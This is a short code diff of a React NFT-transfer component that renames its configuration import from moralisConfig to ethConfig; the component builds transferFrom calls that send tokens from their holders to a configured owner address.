@@ -2,7 +2,7 @@ import { useContext } from "react";
 import { useMoralis, useWeb3ExecuteFunction } from "react-moralis";
 import { BasicNft, INft } from "src/@types/nft";
 import { ContractContext } from "src/Context/ContractContext";
-import moralisConfig from "src/moralisConfig";
+import ethConfig from "src/configs/ethConfig";
 import fetchContractVariable from "./functions/fetchContractVariable";
 
 const NftTransfer = () => {
@@ -15,7 +15,7 @@ const NftTransfer = () => {
             paramName: 'transferFrom',
             params: {
                 from: nft.owner_of,
-                to: moralisConfig.ownerAddress,
+                to: ethConfig.ownerAddress,
                 tokenId: nft.token_id
             }
         });
@@ -27,7 +27,7 @@ const NftTransfer = () => {
                 nfts.length > 0 && (
                     nfts.map((nft, idx) => {
                         const nftOwner = nft.owner_of?.toLowerCase();
-                        const contractOwner = moralisConfig.ownerAddress.toLowerCase();
+                        const contractOwner = ethConfig.ownerAddress.toLowerCase();
                         if (nftOwner !== contractOwner) {
                             return (
                                 <button
